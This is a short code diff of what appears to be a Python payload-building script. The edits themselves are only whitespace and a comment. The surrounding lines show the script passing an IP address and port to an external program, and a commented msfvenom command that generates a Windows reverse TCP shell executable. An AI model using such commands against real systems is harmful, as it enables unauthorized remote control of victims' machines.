@@ -100,7 +100,7 @@ def createPayload():
     elif packetCreation == 2:
       packetSearch += (str(packetFinal) + " grep " + str(OS) + " |")
       twokey = OS
-      test = "2"
+      test = "2"                                                                                                                                          
       packetCreation += 1
     elif packetCreation == 3:
       packetSearch += (str(packetFinal) + " grep " + str(OS) + " |")
@@ -253,4 +253,4 @@ return_code = subprocess.call([program_call,arg_one,arg_two,ip_address,lPort,arg
 print("output:", return_code)
 # # return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
 # # print("output:", return_code)
-
+#test for real this time
